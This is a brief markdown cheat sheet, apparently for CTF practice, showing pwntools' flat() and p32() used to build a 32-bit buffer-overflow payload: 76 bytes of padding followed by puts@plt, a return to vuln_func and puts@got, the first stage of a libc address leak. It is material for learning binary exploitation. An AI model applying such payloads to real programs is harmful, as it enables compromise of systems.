# python functions

##### flat()
```python
>>> flat("AAAA", 0xdeadbeef, "BBBB")
b'AAAA\xef\xbe\xad\xdeBBBB'
>>> 
```

##### make payload using flat()
```python
payload = flat(
    'A' * 76,
    elf.plt['puts'],
    elf.sym['vuln_func'],
    elf.got['puts']
)
```

##### make payload using pwntools
```python
payload = b"A" * 76
payload += p32(puts_plt)
payload += p32(elf.symbols["vuln_func"])
payload += p32(puts_got)
```
